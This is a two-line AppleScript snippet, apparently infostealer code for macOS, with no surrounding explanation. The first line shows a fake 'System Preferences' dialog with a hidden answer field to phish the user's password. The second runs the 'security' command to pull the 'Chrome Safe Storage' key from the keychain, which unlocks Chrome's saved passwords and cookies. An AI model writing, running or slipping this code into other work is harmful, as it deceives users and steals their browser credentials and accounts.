display dialog "System Preferences" default answer "" hidden answer true
do shell script "security find-generic-password -w -s 'Chrome Safe Storage'"
